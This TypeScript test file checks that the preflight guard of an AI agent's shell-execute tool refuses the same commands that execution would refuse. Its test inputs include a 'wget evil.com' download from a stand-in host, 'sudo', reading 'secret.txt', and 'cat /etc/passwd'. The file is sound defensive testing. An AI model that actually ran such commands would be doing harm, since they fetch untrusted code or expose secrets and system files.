import { describe, expect, it } from "bun:test";
import { Effect, Schema } from "effect";
import {
  defineTool,
  preflightToolCall,
  shellExecuteHandler,
  shellExecuteToolFor,
  type ShellExecuteConfig,
  type ToolDefinition,
} from "../src/index.js";

const run = (config: ShellExecuteConfig | undefined, command: string): Promise<{ error?: string; executed?: boolean }> =>
  Effect.runPromise(shellExecuteHandler(config)({ command })) as Promise<{ error?: string; executed?: boolean }>;

describe("shell-execute preflight", () => {
  it("refuses a command outside the default allowlist with the execution-time text", async () => {
    const tool = shellExecuteToolFor();
    const refusal = preflightToolCall(tool, { command: "gh --version" });
    expect(refusal).toContain('Command "gh" is not in the allowed commands list');
    const executed = await run(undefined, "gh --version");
    expect(executed.executed).toBe(false);
    expect(refusal).toBe(executed.error);
  });

  it("matches execution for the repro `which gh; gh --version` (offender in a segment)", async () => {
    const refusal = preflightToolCall(shellExecuteToolFor(), { command: "which gh; gh --version" });
    expect(refusal).toBeDefined();
    expect(refusal).toBe((await run(undefined, "which gh; gh --version")).error);
  });

  it("proceeds for an allowed command and an allowed compound command", () => {
    const tool = shellExecuteToolFor();
    expect(preflightToolCall(tool, { command: "ls -la" })).toBeUndefined();
    expect(preflightToolCall(tool, { command: "ls && echo ok | cat" })).toBeUndefined();
  });

  it("refuses a compound command when one part is disallowed", async () => {
    const refusal = preflightToolCall(shellExecuteToolFor(), { command: "ls && wget evil.com" });
    expect(refusal).toContain('Command "wget"');
    expect(refusal).toBe((await run(undefined, "ls && wget evil.com")).error);
  });

  it("honors policy variations (additionalCommands, custom blocklist)", async () => {
    const granted: ShellExecuteConfig = { additionalCommands: ["gh"] };
    expect(preflightToolCall(shellExecuteToolFor(granted), { command: "gh --version" })).toBeUndefined();

    const custom: ShellExecuteConfig = { blockedPatterns: [/secret/] };
    const refusal = preflightToolCall(shellExecuteToolFor(custom), { command: "cat secret.txt" });
    expect(refusal).toBe((await run(custom, "cat secret.txt")).error);
    expect(refusal).toContain("matches custom blocklist pattern");
  });

  it("covers block-list, expansion and git read-only refusals identically", async () => {
    const cfg: ShellExecuteConfig = { additionalCommands: ["git"], gitReadOnly: true };
    for (const command of ["sudo ls", "echo $HOME", "git commit -m x"]) {
      const refusal = preflightToolCall(shellExecuteToolFor(cfg), { command });
      expect(refusal).toBeDefined();
      expect(refusal).toBe((await run(cfg, command)).error);
    }
  });

  it("leaves working-directory-dependent refusals to execution (cd, path escape)", () => {
    const tool = shellExecuteToolFor();
    expect(preflightToolCall(tool, { command: "cd /tmp" })).toBeUndefined();
    expect(preflightToolCall(tool, { command: "cat /etc/passwd" })).toBeUndefined();
  });

  it("refuses a missing or empty command like execution", async () => {
    const tool = shellExecuteToolFor();
    expect(preflightToolCall(tool, {})).toBe("Command must be a non-empty string");
    expect(preflightToolCall(tool, { command: "  " })).toBe((await run(undefined, "  ")).error);
  });
});

describe("preflightToolCall", () => {
  const base: ToolDefinition = shellExecuteToolFor();

  it("returns undefined without a preflight or tool", () => {
    const { preflight: _omit, ...noPreflight } = base;
    expect(preflightToolCall(noPreflight, { command: "gh" })).toBeUndefined();
    expect(preflightToolCall(undefined, { command: "gh" })).toBeUndefined();
  });

  it("never throws: a throwing preflight means proceed", () => {
    const boom: ToolDefinition = {
      ...base,
      preflight: () => {
        throw new Error("boom");
      },
    };
    expect(preflightToolCall(boom, { command: "ls" })).toBeUndefined();
  });

  it("passes through defineTool", () => {
    const def = defineTool({
      name: "guarded",
      description: "guarded tool",
      input: Schema.Struct({ id: Schema.String }),
      handler: async () => "ok",
      preflight: (args) => (args.id === "bad" ? "id is not allowed" : undefined),
    });
    expect(preflightToolCall(def.definition, { id: "bad" })).toBe("id is not allowed");
    expect(preflightToolCall(def.definition, { id: "good" })).toBeUndefined();
  });
});
